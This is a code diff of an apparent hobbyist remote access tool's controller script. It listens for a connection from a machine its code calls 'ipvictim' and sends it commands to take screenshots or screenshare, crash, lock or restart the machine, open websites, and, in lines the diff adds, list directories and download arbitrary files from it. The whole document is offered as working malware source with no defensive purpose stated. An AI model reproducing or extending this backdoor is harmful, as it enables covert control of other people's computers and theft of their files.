@@ -5,7 +5,7 @@ from vidstream import StreamingServer
 import threading
 import time
 
-ip = "192.168.178.59"
+ip = "127.0.0.1"
 port=8080
 restart = True
 
@@ -22,15 +22,15 @@ else:
 """
 
 def main():
-        conn = connect()
+        conn, sock = connect()
         while True:
             command = input(str("Command >> "))
             if command == "exit":
-                exit(conn, command)
+                exitt(conn, command)
             elif command == "username":
                 username(conn, command)
             elif command == "screenshare":
-                screenshare(conn, command)
+                screenshare(conn, command, sock)
             elif command == "website":
                 website(conn, command)
             elif command == "crash":
@@ -41,6 +41,16 @@ def main():
                 lock(conn, command)
             elif command == "restart":
                 restart(conn, command)
+            elif command == "getcwd":
+                getcwd(conn, command)
+            elif command == "files":
+                files(conn, command)
+            elif command == "download":
+                download(conn, command)
+            elif command == "upload":
+                print("nope")
+            elif command == "remove":
+                print("nope")
         conn.close()
 
 
@@ -52,13 +62,38 @@ def connect():
     print("[+] listening")
     conn, ipvictim = sock.accept()
     print("[+] Connected")
-    return conn
+    return conn, sock
 
 
 
-def exit(conn, command):
-    print(conn)
-    print(command)
+def download(conn, command):
+    conn.send(command.encode())
+    ftd = input("Enter file location >> ")
+    fts = input("Enter save location >> ")
+    conn.send(ftd.encode())
+    filedata = conn.recv(1000000)
+    new_file = open(fts, 'wb')
+    new_file.write(filedata)
+    new_file.close()
+
+
+def files(conn, command):
+    conn.send(command.encode())
+    dir = input("Enter directory >> ")
+    conn.send(dir.encode())
+    output = conn.recv(1024)
+    output = output.decode()
+    print(output)
+
+def getcwd(conn, command):
+    conn.send(command.encode())
+    cwd = conn.recv(1024)
+    cwd = cwd.decode()
+    print(cwd)
+
+
+
+def exitt(conn, command):
     conn.send(command.encode())
     exit()
 
@@ -71,18 +106,17 @@ def username(conn, command):
 
 
 
-def screenshare(conn, command):
+def screenshare(conn, command, sock):
     print("Not working yet")
-    """conn.send(command.encode())
+    conn.send(command.encode())
     sock.close()
     conn.close()
-    receiver = StreamingServer("192.168.178.59", 8080)
+    receiver = StreamingServer("127.0.0.1", 8080)
     t = threading.Thread(target=receiver.start_server)
     t.start()
-    while input(" >> ") != "exit":
-        continue
-    receiver.stop_server()"""
-
+    time.sleep(60)
+    receiver.stop_server()
+    connect()
 
 
 def website(conn, command):
